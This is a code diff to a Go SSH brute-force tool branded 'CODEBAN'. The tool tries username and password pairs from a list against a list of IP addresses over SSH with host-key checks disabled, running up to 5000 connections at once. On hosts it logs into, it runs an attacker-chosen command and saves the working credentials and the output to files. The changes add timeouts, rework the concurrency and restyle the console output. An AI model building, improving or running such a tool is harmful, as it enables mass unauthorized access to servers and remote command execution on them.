@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/fatih/color"
 	"golang.org/x/crypto/ssh"
@@ -20,6 +21,7 @@ var (
 	ipUserPairsMu  sync.Mutex
 	wg             sync.WaitGroup
 	allowedIPRange *net.IPNet
+	maxConnections = 5000 // Adjust this according to your resources
 )
 
 type connectionStatus struct {
@@ -74,6 +76,7 @@ func createSSHSession(ip, username, port, password string) (*ssh.Session, error)
 			ssh.Password(password),
 		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout:         TimeoutSeconds * time.Second,
 	}
 
 	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", ip, port), config)
@@ -100,7 +103,9 @@ func isNoLogin(err error) bool {
 }
 
 func checkConnectionForIP(user, pass, command, ip, port string) {
-	defer wg.Done()
+	defer func() {
+		wg.Done()
+	}()
 
 	if allowedIPRange != nil {
 		ipAddr := net.ParseIP(ip)
@@ -139,19 +144,24 @@ func checkConnectionForIP(user, pass, command, ip, port string) {
 
 	handleGoodConnection(ip, user, pass, output, port)
 }
-
 func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 	upf, err := os.Open(userpassFile)
 	if err != nil {
-		handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
+		handleError(NewCustomError(fmt.Sprintf("\033[01;37mPassfile \033[096m- %s", err)))
 		return
 	}
 	defer upf.Close()
 
-	semaphore := make(chan struct{}, threads)
+	// Read the IP list into memory
+	ipList, err := readIPList(ipListFile)
+	if err != nil {
+		handleError(NewCustomError(fmt.Sprintf("\033[01;37mIP List \033[096m- %s", err)))
+		return
+	}
 
-	printBanner()
-	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")
+	semaphore := make(chan struct{}, maxConnections)
+
+	fmt.Printf("\n\n\033[01;31m[ \033[01;31m>> \033[01;31m] \033[01;37mBrute Force - \033[01;32mON\033[0m\n\n")
 
 	scanner := bufio.NewScanner(upf)
 	for scanner.Scan() {
@@ -161,19 +171,10 @@ func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 			user := parts[0]
 			pass := parts[1]
 
-			fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)
+			fmt.Printf("\t\033[01;31m[\033[01;37m %s \033[01;31m]\033[0m - \033[01;31m[\033[01;37m %s \033[01;31m]\033[0m\n", user, pass)
 
-			ipf, err := os.Open(ipListFile)
-			if err != nil {
-				handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
-				continue
-			}
-			defer ipf.Close()
-
-			scannerIP := bufio.NewScanner(ipf)
 			var ipBatch []string
-			for scannerIP.Scan() {
-				ip := scannerIP.Text()
+			for _, ip := range ipList {
 				ipBatch = append(ipBatch, ip)
 
 				// When the batch size is reached, process the batch concurrently
@@ -195,36 +196,52 @@ func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 
 	// Wait for all goroutines to finish
 	wg.Wait()
+	fmt.Println("\n\033[01;31m[ \033[01;31m>> \033[01;31m] \033[01;37mBrute Force - \033[01;31mOFF \033[0m")
+}
 
-	// Display the colored completion message
-	fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
+func readIPList(ipListFile string) ([]string, error) {
+	ipf, err := os.Open(ipListFile)
+	if err != nil {
+		return nil, err
+	}
+	defer ipf.Close()
+
+	var ipList []string
+	scannerIP := bufio.NewScanner(ipf)
+	for scannerIP.Scan() {
+		ip := scannerIP.Text()
+		ipList = append(ipList, ip)
+	}
+
+	return ipList, scannerIP.Err()
 }
 
 func processIPBatch(user, pass, command, port string, ipBatch []string, semaphore chan struct{}) {
 	// Acquire semaphore
 	semaphore <- struct{}{}
-	wg.Add(1)
-	go func(user, pass, command, port string, ipBatch []string) {
-		defer wg.Done()
-		defer func() {
-			// Release semaphore
-			<-semaphore
-		}()
-		for _, ip := range ipBatch {
+
+	for _, ip := range ipBatch {
+		// Move the wg.Add(1) call here to ensure it's called only once per IP
+		wg.Add(1)
+		go func(user, pass, command, port, ip string) {
+			defer func() {
+				// Release semaphore
+				<-semaphore
+			}()
 			checkConnectionForIP(user, pass, command, ip, port)
-		}
-	}(user, pass, command, port, ipBatch)
+		}(user, pass, command, port, ip)
+	}
 }
 
 func printBanner() {
-	fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
-	fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
-	fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝")
+	fmt.Println("\t\033[01;31m╭────────────────────────────────────────────────────╮")
+	fmt.Println("\t\033[01;31m│              \033[31mC   O\033[33m   D   E   \033[096mB   A   N\033[0m             \033[01;31m│")
+	fmt.Println("\t\033[01;31m╰────────────────────────────────────────────────────╯")
 }
 
 func handleError(err error) {
-	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
-	color.Cyan(errorMessage)
+	errorMessage := fmt.Sprintf("\033[01;31m[\033[01;37m !\033[01;31m ] \033[01;31mError \033[01;31m- %s\n", err)
+	fmt.Print(errorMessage)
 }
 
 func countLines(filename string) (int, error) {
@@ -244,11 +261,11 @@ func countLines(filename string) (int, error) {
 }
 
 func handleGoodConnection(ip, user, pass string, output []byte, port string) {
-	fmt.Printf("[ Good ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
-	fmt.Printf("Command Output: %s\n", output)
-	vulnf, err := os.OpenFile("good_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	fmt.Printf("\033[01;31m[\033[01;32m Good \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m - \033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[0m\n", user, ip, pass, port)
+	fmt.Printf("\033[01;31m[ \033[01;37mCMD \033[01;31m] - \033[01;37m%s\n\033[0m", output)
+	vulnf, err := os.OpenFile("good.cdx", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		handleError(NewCustomError("Failed to open good_logins.txt"))
+		handleError(NewCustomError("\033[01;37mFailed to open good.cdx"))
 		return
 	}
 	defer vulnf.Close()
@@ -263,14 +280,14 @@ func handleGoodConnection(ip, user, pass string, output []byte, port string) {
 	}
 	ipUserPairs[ipKey].Good = true
 
-	logToFile(vulnf, fmt.Sprintf("[ Good ] | %s@%s %s\nCommand Output: %s", user, ip, pass, output))
+	logToFile(vulnf, fmt.Sprintf("[ Good ] | %s@%s %s [ %s ] \n[ CMD ] - %s\n", user, ip, pass, port, output))
 }
+func handleNoLogin(ip, user, pass string, port string) {
+	fmt.Printf("\033[01;31m[\033[01;31m NoLogin \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m - \033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[01;31m[\033[01;37m %s \033[01;31m]\033[0m\n", user, ip, pass, port)
 
-func handleNoLogin(ip, user, pass, port string) {
-	fmt.Printf("[ NoLogin ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
-	vulnf, err := os.OpenFile("nologin_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	vulnf, err := os.OpenFile("nologins.cdx", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		handleError(NewCustomError("Failed to open nologin_logins.txt"))
+		handleError(NewCustomError("\033[01;37mFailed to open nologins.cdx"))
 		return
 	}
 	defer vulnf.Close()
@@ -285,19 +302,18 @@ func handleNoLogin(ip, user, pass, port string) {
 	}
 	ipUserPairs[ipKey].Bad = true
 
-	logToFile(vulnf, fmt.Sprintf("[ NoLogin ] | %s@%s %s", user, ip, pass))
+	logToFile(vulnf, fmt.Sprintf("[ NoLogin ] | %s@%s %s [ %s ]\n", user, ip, pass, port))
 }
 
-func logToFile(file *os.File, logEntry string) {
-	if _, err := file.WriteString(logEntry + "\n"); err != nil {
-		handleError(NewCustomError("Failed to write to log file"))
+func logToFile(file *os.File, message string) {
+	_, err := file.WriteString(message)
+	if err != nil {
+		handleError(NewCustomError(fmt.Sprintf("\033[01;37mFailed to write to log file: %s", err)))
 	}
 }
-
 func main() {
-	// Usage message with information about the -S option
-	usage := "Usage: ./brute <userpass file> <custom command> <ip list file> <port> <threads> [-S <IP segment>]"
-
+	printBanner()
+	usage := "\033[01;31m[\033[01;37m Usage\033[01;31m ] \033[01;31m[\033[01;37m -\033[01;31m ] \033[01;31m[\033[01;37m ./brute \033[01;31m] [\033[01;37m userpass \033[01;31m] [\033[01;37m cmd \033[01;31m] [\033[01;37m ipfile \033[01;31m] [\033[01;37m port \033[01;31m] [\033[01;37m threads \033[01;31m] [\033[01;33m -S\033[01;31m -> \033[01;37mIPseg \033[01;31m]\033[0m"
 	// Parse command line arguments
 	flag.Parse()
 
@@ -314,7 +330,7 @@ func main() {
 	port := flag.Arg(3)
 	threads, err := strconv.Atoi(flag.Arg(4))
 	if err != nil {
-		handleError(NewCustomError("Invalid thread count"))
+		handleError(NewCustomError("\033[01;37mInvalid thread count"))
 		os.Exit(1)
 	}
 
@@ -323,7 +339,7 @@ func main() {
 		// Use ipSegmentFlag.CIDR directly
 		_, ipNet, err := net.ParseCIDR(ipSegmentFlag.CIDR)
 		if err != nil {
-			handleError(NewCustomError("Invalid IP segment format"))
+			handleError(NewCustomError("\033[01;37mInvalid IP segment format"))
 			os.Exit(1)
 		}
 		allowedIPRange = ipNet
@@ -331,4 +347,5 @@ func main() {
 
 	// Perform the VPS check with the specified parameters
 	checkVPS(userpassFile, command, ipListFile, port, threads)
+
 }
